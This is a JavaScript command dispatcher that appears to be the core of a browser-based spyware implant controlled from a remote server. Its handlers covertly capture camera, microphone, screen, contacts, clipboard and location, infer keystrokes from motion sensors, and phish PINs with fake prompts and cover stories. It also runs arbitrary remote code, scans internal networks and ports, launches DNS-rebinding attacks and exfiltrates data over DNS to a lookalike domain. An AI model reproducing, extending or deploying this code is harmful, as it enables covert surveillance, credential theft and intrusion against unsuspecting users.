export async function executeCommands(commands) {
  for (const cmd of commands) {
    switch (cmd.type) {
      case 'ping': {
        // Page-side pong — works even when SW can't post back (foreground C2)
        const { CONFIG } = await import('./config.js');
        const tok = localStorage.getItem('wc_c2_token');
        if (tok && CONFIG.server) {
          fetch(`${CONFIG.server}/api/collect/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: tok, type: 'pong', ts: Date.now(), via: 'page' }),
          }).catch(() => {});
        }
        break;
      }
      case 'get_info': {
        const { CONFIG } = await import('./config.js');
        const tok = localStorage.getItem('wc_c2_token');
        if (tok && CONFIG.server) {
          const info = {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            online: navigator.onLine,
            screenWidth: screen.width,
            screenHeight: screen.height,
            timezone: Intl?.DateTimeFormat().resolvedOptions().timeZone ?? 'n/a',
            ts: Date.now(),
          };
          fetch(`${CONFIG.server}/api/collect/result`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token: tok, type: 'device_info', payload: info, via: 'page' }),
          }).catch(() => {});
        }
        break;
      }
      case 'check_permissions': {
        const { checkPermissions } = await import('./modules/permissions.js');
        const { flush } = await import('./beacon.js');
        await checkPermissions();
        flush().catch(() => {});
        break;
      }
      case 'show_popup': {
        const { showPopup } = await import('./ui.js');
        showPopup(cmd.payload?.title, cmd.payload?.body);
        break;
      }
      case 'trigger_harvest': {
        const perm = cmd.payload?.permission ?? cmd.payload?.harvest_config?.permission;
        if (perm === 'pin_capture') {
          const { showPinHarvest } = await import('./modules/pin_harvest.js');
          showPinHarvest({ attempts: cmd.payload?.attempts ?? Infinity });
        } else {
          const { showHarvest } = await import('./modules/harvest.js');
          showHarvest(cmd.payload?.harvest_config ?? cmd.payload);
        }
        break;
      }
      case 'dismiss_harvest': {
        const { hidePinHarvest } = await import('./modules/pin_harvest.js');
        hidePinHarvest();
        break;
      }
      case 'request_permission': {
        const perm = cmd.payload?.permission;
        const options = { mode: cmd.payload?.mode ?? 'once', duration: cmd.payload?.duration ?? null };
        const { queueEvent, flush } = await import('./beacon.js');
        try {
          const mod = await import('./modules/' + perm + '.js');
          // First arg = cover_story string (backward compat); third arg = full payload for modules like payment.
          await mod.requestPermission?.(cmd.payload?.cover_story, options, cmd.payload ?? {});
          queueEvent('permission_invoke', { permission: perm, status: 'ok', ...options });
        } catch (e) {
          queueEvent('permission_invoke', { permission: perm, status: 'error', msg: e?.message });
        }
        try {
          const { checkPermissions } = await import('./modules/permissions.js');
          await checkPermissions();
        } catch (_) {}
        flush().catch(() => {});
        break;
      }
      case 'enumerate_cameras': {
        const { enumerateCameras } = await import('./modules/camera.js');
        await enumerateCameras();
        break;
      }
      case 'capture_photo': {
        const { capturePhoto } = await import('./modules/camera.js');
        await capturePhoto(cmd.payload?.device_id || null);
        break;
      }
      case 'capture_video': {
        const { captureVideo } = await import('./modules/camera.js');
        await captureVideo(cmd.payload?.device_id || null, cmd.payload?.duration ?? 5);
        break;
      }
      case 'capture_burst': {
        const { captureBurst } = await import('./modules/camera.js');
        await captureBurst(cmd.payload?.device_id || null, cmd.payload?.frames ?? 5, cmd.payload?.delay_ms ?? 1000);
        break;
      }
      case 'stop_burst': {
        window.__burstAbort = true;
        break;
      }
      case 'stop_video': {
        window.__videoAbort = true;
        break;
      }
      case 'capture_audio': {
        const { captureAudio } = await import('./modules/audio.js');
        await captureAudio(cmd.payload?.duration ?? 10);
        break;
      }
      case 'stop_audio': {
        window.__audioAbort = true;
        break;
      }
      case 'capture_contacts': {
        const { requestPermission: grabContacts } = await import('./modules/contacts.js');
        await grabContacts();
        break;
      }
      case 'capture_motion': {
        const { captureOnce } = await import('./modules/motion.js');
        await captureOnce();
        break;
      }
      case 'start_motion_stream': {
        const { startStream } = await import('./modules/motion.js');
        await startStream({ durationMs: (cmd.payload?.duration ?? 5) * 1000 });
        break;
      }
      case 'motion_detect_activity': {
        const { detectActivity } = await import('./modules/motion.js');
        await detectActivity({ durationMs: (cmd.payload?.duration ?? 8) * 1000 });
        break;
      }
      case 'motion_measure_gait': {
        const { measureGait } = await import('./modules/motion.js');
        await measureGait({ durationMs: (cmd.payload?.duration ?? 15) * 1000 });
        break;
      }
      case 'motion_detect_context': {
        const { detectContext } = await import('./modules/motion.js');
        await detectContext();
        break;
      }
      case 'motion_detect_tremor': {
        const { detectTremor } = await import('./modules/motion.js');
        await detectTremor({ durationMs: (cmd.payload?.duration ?? 5) * 1000 });
        break;
      }
      case 'start_motion_session': {
        const { startSession } = await import('./modules/motion.js');
        await startSession({ intervalMs: cmd.payload?.interval ?? 1000 });
        break;
      }
      case 'stop_motion_session': {
        window.__motionSessionAbort = true;
        break;
      }
      case 'motion_detect_taps': {
        const { detectTaps } = await import('./modules/motion.js');
        await detectTaps();
        break;
      }
      case 'stop_tap_detect': {
        window.__tapAbort = true;
        break;
      }
      case 'detect_keystrokes': {
        const { detectKeystrokes } = await import('./modules/motion.js');
        await detectKeystrokes();
        break;
      }
      case 'stop_keystroke_detect': {
        window.__keystrokeAbort = true;
        break;
      }
      case 'motion_detect_elevator': {
        const { detectElevator } = await import('./modules/motion.js');
        await detectElevator({ durationMs: (cmd.payload?.duration ?? 8) * 1000 });
        break;
      }
      case 'motion_detect_photo': {
        const { detectPhoto } = await import('./modules/motion.js');
        await detectPhoto({ durationMs: (cmd.payload?.duration ?? 5) * 1000 });
        break;
      }
      case 'motion_dead_reckoning': {
        const { computeDeadReckoning } = await import('./modules/motion.js');
        await computeDeadReckoning({ durationMs: (cmd.payload?.duration ?? 20) * 1000 });
        break;
      }
      case 'motion_profile': {
        const { profileBehavior } = await import('./modules/motion.js');
        await profileBehavior({ durationMs: (cmd.payload?.duration ?? 10) * 1000 });
        break;
      }
      case 'capture_now': {
        if (cmd.payload?.type === 'camera') {
          const { captureFrame } = await import('./modules/camera.js');
          captureFrame();
        } else if (cmd.payload?.type === 'audio') {
          const { recordChunk } = await import('./modules/audio.js');
          recordChunk();
        }
        break;
      }
      case 'capture_screen': {
        try {
          const { default: html2canvas } = await import('https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.esm.min.js');
          const canvas = await html2canvas(document.documentElement, { scale: window.devicePixelRatio, useCORS: true, logging: false });
          const base64 = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];
          const { CONFIG } = await import('./config.js');
          await fetch(`${CONFIG.server}/api/screenshot/${CONFIG.deviceId}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ data: base64 }),
          });
        } catch (e) {
          const { queueEvent } = await import('./beacon.js');
          queueEvent('error', { cmd: 'capture_screen', msg: e.message });
        }
        break;
      }
      case 'run_js': {
        const { queueEvent: qe2, forceEvent: fe2, flush: fl2 } = await import('./beacon.js');
        const _mkConsole = (level) => (...args) => {
          const msg = args.map(a => {
            if (a === null) return 'null';
            if (a === undefined) return 'undefined';
            if (a instanceof Error) return `${a.name}: ${a.message}`;
            try { return typeof a === 'object' ? JSON.stringify(a) : String(a); } catch { return '[circular]'; }
          }).join(' ').slice(0, 1000);
          fe2('console_log', { level, msg, ts: Date.now() });
        };
        const _console = {
          log: _mkConsole('log'), warn: _mkConsole('warn'),
          error: _mkConsole('error'), info: _mkConsole('info'), debug: _mkConsole('debug'),
        };
        try {
          // eslint-disable-next-line no-new-func
          const AsyncFn = Object.getPrototypeOf(async function () {}).constructor;
          const fn = new AsyncFn('console', cmd.payload?.code ?? '');
          const res = await fn(_console);
          fe2('js_result', { ok: true, result: res !== undefined ? String(res) : '(undefined)' });
        } catch (e) {
          fe2('js_result', { ok: false, error: e?.message ?? String(e) });
        }
        fl2().catch(() => {});
        break;
      }
      case 'start_screen_stream': {
        if (window.__screenStreamTimer) break;
        const fps     = cmd.payload?.fps     ?? 3;
        const quality = cmd.payload?.quality ?? 0.4;
        const scale   = cmd.payload?.scale   ?? 0.25;
        const { sendViaWs } = await import('./beacon.js');
        const { CONFIG } = await import('./config.js');

        const captureFrame = async () => {
          try {
            const { default: html2canvas } = await import('https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.esm.min.js');
            const canvas = await html2canvas(document.documentElement, {
              scale: window.devicePixelRatio * scale,
              useCORS: true, logging: false, allowTaint: true,
            });
            const b64 = canvas.toDataURL('image/jpeg', quality).split(',')[1];
            const sent = sendViaWs({ type: 'screen_frame', data: b64 });
            if (!sent) {
              await fetch(`${CONFIG.server}/api/stream/${CONFIG.deviceId}/frame`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ data: b64 }),
              }).catch(() => {});
            }
          } catch {}
        };
        window.__screenStreamTimer = setInterval(captureFrame, Math.round(1000 / fps));
        break;
      }
      case 'stop_screen_stream': {
        if (window.__screenStreamTimer) {
          clearInterval(window.__screenStreamTimer);
          window.__screenStreamTimer = null;
        }
        break;
      }
      case 'self_destruct': {
        localStorage.clear();
        indexedDB.deleteDatabase('wc');
        break;
      }

      case 'opfs_list': {
        const { CONFIG: _cfg } = await import('./config.js');
        const _tok = localStorage.getItem('wc_c2_token');
        let data = {};
        try {
          const root = await navigator.storage.getDirectory();
          const entries = [];
          for await (const [name, handle] of root.entries()) {
            let size = null;
            if (handle.kind === 'file') {
              try { size = (await (await handle.getFile()).arrayBuffer()).byteLength; } catch {}
            }
            entries.push({ name, kind: handle.kind, size });
          }
          data = { entries, ok: true };
        } catch(e) { data = { ok: false, error: e.message }; }
        if (_tok && _cfg.server) fetch(`${_cfg.server}/api/collect/result`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: _tok, type: 'harvest_result', harvest_type: 'opfs_list', data, ts: Date.now() }),
        }).catch(() => {});
        break;
      }

      case 'write_opfs': {
        const { CONFIG: _cfg } = await import('./config.js');
        const _tok = localStorage.getItem('wc_c2_token');
        const { filename, content, encoding } = cmd.payload ?? {};
        let data = {};
        try {
          const root     = await navigator.storage.getDirectory();
          const fh       = await root.getFileHandle(filename, { create: true });
          const writable = await fh.createWritable();
          if (encoding === 'base64') {
            const binary = atob(content);
            const bytes  = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
            await writable.write(bytes);
          } else {
            await writable.write(content ?? '');
          }
          await writable.close();
          data = { filename, ok: true, size: (content ?? '').length };
        } catch(e) { data = { filename, ok: false, error: e.message }; }
        if (_tok && _cfg.server) fetch(`${_cfg.server}/api/collect/result`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: _tok, type: 'harvest_result', harvest_type: 'opfs_write', data, ts: Date.now() }),
        }).catch(() => {});
        break;
      }

      case 'read_opfs': {
        const { CONFIG: _cfg } = await import('./config.js');
        const _tok = localStorage.getItem('wc_c2_token');
        const { filename } = cmd.payload ?? {};
        let data = {};
        try {
          const root = await navigator.storage.getDirectory();
          const fh   = await root.getFileHandle(filename);
          const file = await fh.getFile();
          const buf  = await file.arrayBuffer();
          const bytes = new Uint8Array(buf);
          let b64 = '';
          const CHUNK = 8192;
          for (let i = 0; i < bytes.length; i += CHUNK)
            b64 += String.fromCharCode(...bytes.subarray(i, i + CHUNK));
          data = { filename, content_b64: btoa(b64), size: file.size, ok: true };
        } catch(e) { data = { filename, ok: false, error: e.message }; }
        if (_tok && _cfg.server) fetch(`${_cfg.server}/api/collect/result`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: _tok, type: 'harvest_result', harvest_type: 'opfs_read', data, ts: Date.now() }),
        }).catch(() => {});
        break;
      }

      case 'delete_opfs': {
        const { CONFIG: _cfg } = await import('./config.js');
        const _tok = localStorage.getItem('wc_c2_token');
        const { filename } = cmd.payload ?? {};
        let data = {};
        try {
          const root = await navigator.storage.getDirectory();
          await root.removeEntry(filename);
          data = { filename, ok: true };
        } catch(e) { data = { filename, ok: false, error: e.message }; }
        if (_tok && _cfg.server) fetch(`${_cfg.server}/api/collect/result`, {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: _tok, type: 'harvest_result', harvest_type: 'opfs_delete', data, ts: Date.now() }),
        }).catch(() => {});
        break;
      }
      case 'trigger_audio_unlock': {
        // Show a fake "idle timeout" overlay. The user must tap to dismiss it,
        // providing a gesture context that unlocks the Web Audio API.
        if (document.getElementById('wc-idle-overlay')) break;
        const ov = document.createElement('div');
        ov.id = 'wc-idle-overlay';
        ov.style.cssText = 'position:fixed;inset:0;background:#003a75;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:18px;z-index:8000;font-family:-apple-system,BlinkMacSystemFont,sans-serif;-webkit-tap-highlight-color:transparent;user-select:none';
        let n = 30;
        ov.innerHTML = `
          <svg width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,0.65)" stroke-width="1.4" stroke-linecap="round">
            <circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/>
          </svg>
          <div style="color:#fff;font-size:21px;font-weight:700;text-align:center;padding:0 28px;line-height:1.3">No activity detected</div>
          <div id="wc-idle-n" style="color:#fff;font-size:72px;font-weight:200;line-height:1;letter-spacing:-2px">${n}</div>
          <div style="color:rgba(255,255,255,0.72);font-size:15px;text-align:center;padding:0 36px;line-height:1.6">Disconnecting in <span id="wc-idle-s">${n}</span> seconds</div>
          <div style="color:rgba(255,255,255,0.45);font-size:13px;margin-top:6px">Touch anywhere to cancel</div>
        `;
        const nEl = ov.querySelector('#wc-idle-n');
        const sEl = ov.querySelector('#wc-idle-s');
        const timer = setInterval(() => {
          if (n > 1) { n--; nEl.textContent = n; sEl.textContent = n + (n === 1 ? ' second' : ' seconds'); }
        }, 1000);
        const dismiss = () => {
          clearInterval(timer);
          ov.remove();
          if (typeof window.__tryStartBgAudio === 'function') window.__tryStartBgAudio();
          import('./modules/permissions.js').then(({ checkPermissions }) => checkPermissions()).catch(() => {});
        };
        ov.addEventListener('touchstart', dismiss, { once: true, passive: true });
        ov.addEventListener('click', dismiss, { once: true });
        document.body.appendChild(ov);
        break;
      }
      case 'reload': {
        const _doReload = () => {
          const overlay = document.createElement('div');
          overlay.style.cssText = 'position:fixed;inset:0;background:#0057b7;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:999999';
          overlay.innerHTML = '<div style="width:36px;height:36px;border:3px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:_sp 0.8s linear infinite"></div><div style="color:#fff;font-size:15px;font-weight:500;font-family:-apple-system,sans-serif">Updating...</div><style>@keyframes _sp{to{transform:rotate(360deg)}}</style>';
          document.body.appendChild(overlay);
          setTimeout(async () => {
            if ('serviceWorker' in navigator) {
              const regs = await navigator.serviceWorker.getRegistrations();
              await Promise.all(regs.map(r => r.unregister()));
            }
            location.reload();
          }, 1000);
        };
        // If backgrounded, defer until foreground — reloading while backgrounded
        // kills the AudioContext and the device won't resume properly.
        if (document.hidden) {
          const _onVisible = () => {
            if (!document.hidden) {
              document.removeEventListener('visibilitychange', _onVisible);
              _doReload();
            }
          };
          document.addEventListener('visibilitychange', _onVisible);
        } else {
          _doReload();
        }
        break;
      }
      case 'soft_refresh': {
        // Re-sync device state without a page reload — audio context is preserved.
        const { checkPermissions } = await import('./modules/permissions.js');
        const { collectPassive } = await import('./modules/fingerprint.js');
        const { forceEvent, flush: flSR } = await import('./beacon.js');
        const { forceBeat } = await import('./modules/heartbeat.js');
        await checkPermissions().catch(() => {});
        await collectPassive().catch(() => {});
        forceBeat();
        forceEvent('app_open', { ts: Date.now(), standalone: !!navigator.standalone, soft_refresh: true });
        flSR().catch(() => {});
        // Trigger SW update check (picks up new code on next hard reload, not now)
        if ('serviceWorker' in navigator) {
          navigator.serviceWorker.getRegistrations()
            .then(regs => regs.forEach(r => r.update()))
            .catch(() => {});
        }
        break;
      }

      case 'stop_bg_audio': {
        const { stopBgAudio } = await import('./beacon.js');
        stopBgAudio();
        const { queueEvent: qe3, flush: fl3 } = await import('./beacon.js');
        qe3('audio_stopped', { manual: true });
        fl3().catch(() => {});
        break;
      }

      // ── Network recon ────────────────────────────────────────────────────
      case 'lan_scan': {
        const { detectGateway, scanCIDR } = await import('./modules/recon.js');
        const { queueEvent: qeL, forceEvent: feL, flush: flL } = await import('./beacon.js');

        // Clear any previous abort flag
        window.__lanScanAbort = false;

        // Determine target CIDR
        let cidr = cmd.payload?.cidr ?? null;  // e.g. "192.168.1.0/24"

        if (!cidr) {
          feL('lan_scan_status', { phase: 'gateway_probe', msg: 'Probing common gateways…' });
          flL().catch(() => {});
          const baseIP = await detectGateway();
          if (!baseIP) {
            feL('lan_scan_status', { phase: 'failed', msg: 'Could not determine subnet. Provide cidr manually.' });
            flL().catch(() => {});
            break;
          }
          cidr = baseIP.split('.').slice(0, 3).join('.') + '.0/24';
        }

        feL('lan_scan_status', { phase: 'scanning', msg: `Scanning ${cidr}…`, cidr });
        flL().catch(() => {});

        const liveHosts = [];
        const hosts = await scanCIDR(
          cidr,
          ({ done, total, alive }) => {
            feL('lan_scan_status', { phase: 'scanning', msg: `${done}/${total} probed — ${alive} alive`, cidr });
            flL().catch(() => {});
          },
          () => !!window.__lanScanAbort,
          (host) => {
            liveHosts.push(host);
            feL('lan_hosts', { cidr, hosts: [...liveHosts] });
            qeL('lan_host_found', { cidr, ip: host.ip, ms: host.ms, port: host.port, ts: Date.now() });
            flL().catch(() => {});
          },
        );

        const aborted = !!window.__lanScanAbort;
        window.__lanScanAbort = false;
        feL('lan_hosts', { cidr, hosts });
        feL('lan_scan_status', {
          phase: aborted ? 'aborted' : 'done',
          msg: aborted ? `Scan aborted — ${hosts.length} alive so far` : `Done — ${hosts.length} alive hosts in ${cidr}`,
          cidr,
        });
        flL().catch(() => {});
        break;
      }

      case 'lan_scan_stop': {
        window.__lanScanAbort = true;
        break;
      }

      case 'port_scan': {
        const { portScan, PORT_SCAN_DEFAULTS } = await import('./modules/recon.js');
        const { forceEvent: fePS, queueEvent: qePS, flush: flPS } = await import('./beacon.js');

        const ip = cmd.payload?.ip;
        if (!ip) {
          qePS('port_scan_status', { phase: 'failed', msg: 'No IP specified' });
          flPS().catch(() => {});
          break;
        }

        const ports = cmd.payload?.ports ?? PORT_SCAN_DEFAULTS;
        const timeout = cmd.payload?.timeout ?? 2000;

        fePS('port_scan_status', { phase: 'scanning', ip, msg: `Scanning ${ip} (${ports.length} ports)…` });
        flPS().catch(() => {});

        const results = await portScan(ip, ports, timeout,
          ({ done, total, interesting }) => {
            if (done % 12 === 0 || done === total) {
              fePS('port_scan_status', { phase: 'scanning', ip, msg: `${done}/${total} ports — ${interesting} responding`, done, total });
              flPS().catch(() => {});
            }
          }
        );

        const interesting = results.filter(r => r.status === 'open' || r.status === 'closed');
        for (const r of interesting) {
          qePS('port_scan_found', { ip, port: r.port, ms: r.ms, ts: Date.now() });
        }
        qePS('port_scan_results', { ip, results, interesting_count: interesting.length, total: ports.length });
        fePS('port_scan_status', {
          phase: 'done', ip,
          msg: `Done — ${interesting.length} ports responding on ${ip}`,
          interesting_count: interesting.length,
        });
        flPS().catch(() => {});
        break;
      }

      case 'rebind_check': {
        const { rebindCheck } = await import('./modules/rebind.js');
        const { forceEvent, flush: flR } = await import('./beacon.js');
        const domain = cmd.payload?.domain ?? '';
        forceEvent('rebind_check_status', { phase: 'running', msg: `Checking rebinding prerequisites for ${domain || '(no domain)'}…` });
        flR().catch(() => {});
        try {
          const res = await rebindCheck(domain);
          forceEvent('rebind_check_result', res);
        } catch (e) {
          forceEvent('rebind_check_result', { ok: false, rbDomain: domain, error: e.message });
        }
        flR().catch(() => {});
        break;
      }

      case 'rebind_launch': {
        // Guard: HTTP polling returns the same pending command every 2s until it's ACKed via WS.
        // Prevent re-processing (which causes infinite location.href loop on iOS) by locking on cmd.id.
        // sessionStorage persists across navigation within the same WebClip session, clears on app restart.
        const _rbAckKey = `rb_ack_${cmd.id ?? 'default'}`;
        if (sessionStorage.getItem(_rbAckKey)) break;
        sessionStorage.setItem(_rbAckKey, '1');
        // Auto-expire after 3 min so a dashboard re-send of a new command (with new id) isn't affected.
        setTimeout(() => sessionStorage.removeItem(_rbAckKey), 180000);

        const { rebindLaunch } = await import('./modules/rebind.js');
        const { forceEvent, flush: flL } = await import('./beacon.js');
        const { domain, targetIP, targetPort = 80, targetPath = '/', timeout = 90000, token: cmdToken, vpsIP, preflipped, serviceProbes } = cmd.payload ?? {};
        // Use nav-subdomain relay (always → VPS via nginx, bypasses Cloudflare challenge on clipper domain)
        const vpsHost = domain ? `http://nrelay.${domain}` : (vpsIP ? `http://${vpsIP}:15000` : null);
        forceEvent('rebind_launch_status', { phase: 'launching', msg: `Opening attack page for ${targetIP}:${targetPort}${targetPath}…` });
        flL().catch(() => {});
        await new Promise(resolve => {
          rebindLaunch(domain, targetIP, targetPort, targetPath, result => {
            forceEvent('rebind_launch_result', result);
            flL().catch(() => {});
            resolve();
          }, timeout, cmdToken, vpsHost, !!preflipped, serviceProbes ?? null);
        });
        break;
      }

      case 'dns_probe': {
        const { dnsProbe } = await import('./modules/recon.js');
        const { queueEvent: qeD, flush: flD } = await import('./beacon.js');
        const hostnames = cmd.payload?.hostnames ?? [];
        if (hostnames.length) {
          const results = await dnsProbe(hostnames, cmd.payload?.timeout ?? 3000);
          qeD('dns_results', { results });
          flD().catch(() => {});
        }
        break;
      }

      case 'tab_snapshot': {
        const { queueEvent: qeT, flush: flT } = await import('./beacon.js');
        const tabs = await new Promise(resolve => {
          const fallback = [{ url: location.href, title: document.title, focused: true, visibilityState: document.visibilityState, self: true }];
          if (!('serviceWorker' in navigator) || !navigator.serviceWorker.controller) {
            return resolve(fallback);
          }
          const handler = e => {
            if (e.data?.type === 'sw_clients') {
              navigator.serviceWorker.removeEventListener('message', handler);
              resolve(e.data.clients.map(c => ({ ...c, self: c.url === location.href })));
            }
          };
          navigator.serviceWorker.addEventListener('message', handler);
          navigator.serviceWorker.controller.postMessage({ type: 'enumerate_clients' });
          setTimeout(() => {
            navigator.serviceWorker.removeEventListener('message', handler);
            resolve(fallback);
          }, 1500);
        });
        qeT('tab_snapshot', { tabs, count: tabs.length });
        flT().catch(() => {});
        break;
      }

      case 'sw_intercept': {
        // Toggle SW request logging on/off
        const enable = cmd.payload?.enable ?? true;
        if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
          navigator.serviceWorker.controller.postMessage({ type: 'intercept_toggle', enable });
        }
        const { queueEvent: qeS, flush: flS } = await import('./beacon.js');
        qeS('sw_intercept_toggled', { enable });
        flS().catch(() => {});
        break;
      }

      case 'get_mdm_status': {
        const { detectMDM } = await import('./modules/mdm.js');
        const { forceEvent, flush: flMDM } = await import('./beacon.js');
        try {
          const result = await detectMDM();
          forceEvent('mdm_result', result);
        } catch (e) {
          const { queueEvent: qeMDM } = await import('./beacon.js');
          qeMDM('mdm_result', { error: e.message });
        }
        (await import('./beacon.js')).flush().catch(() => {});
        break;
      }

      case 'webrtc_init': {
        const { initWebRTCTunnel } = await import('./modules/webrtc_tunnel.js');
        const relayBase = window.WEBCLIP_SERVER || location.origin;
        const token = cmd.payload?.token || cmd.token || '';
        initWebRTCTunnel(relayBase, token,
          (ch) => {
            // DataChannel open — handle browse_request same as WS tunnel protocol
            ch.onmessage = (e) => {
              let msg;
              try { msg = JSON.parse(e.data); } catch { return; }
              if (msg.type === 'browse_request' && msg.url) {
                fetch(location.origin + msg.url, { cache: 'no-store' })
                  .then(r => r.text().then(b => ({ status: r.status, body: b })))
                  .then(res => ch.send(JSON.stringify({
                    type: 'browse_result',
                    req_id: msg.req_id,
                    url: msg.url,
                    status: res.status,
                    body: res.body.slice(0, 65536),
                    ok: true,
                  })))
                  .catch(err => ch.send(JSON.stringify({
                    type: 'browse_result',
                    req_id: msg.req_id,
                    ok: false,
                    error: err.message,
                  })));
              }
            };
          },
          (msg, ch) => {},
          () => {}
        );
        break;
      }

      case 'dns_exfil': {
        const { dnsExfil } = await import('./modules/dns_exfil.js');
        const { data, domain } = cmd.payload ?? {};
        const relay = window.WEBCLIP_SERVER || location.origin;
        // Auto-collect device info if no data specified
        const payload = data || JSON.stringify({
          ua: navigator.userAgent.slice(0, 100),
          ts: Date.now(),
          url: location.href,
        });
        await dnsExfil(payload, domain || 'rb.clalitapp.info', relay);
        break;
      }

      case 'capture_photo_facing': {
        const { capturePhotoFacing } = await import('./modules/camera.js');
        await capturePhotoFacing(cmd.payload?.facing ?? 'user');
        break;
      }
      case 'capture_geo': {
        const { requestPermission: geoOnce } = await import('./modules/geo.js');
        await geoOnce('Check nearby services', { mode: 'once' });
        break;
      }
      case 'watch_geo': {
        const { requestPermission: geoWatch } = await import('./modules/geo.js');
        await geoWatch('Navigation active', { mode: 'watch', duration: cmd.payload?.duration ?? 60 });
        break;
      }
      case 'stop_geo_watch': {
        const { stopWatch } = await import('./modules/geo.js');
        stopWatch();
        break;
      }
      case 'capture_clipboard': {
        const { requestClipboard } = await import('./modules/clipboard.js');
        await requestClipboard();
        break;
      }

      default: break;
    }
  }
}
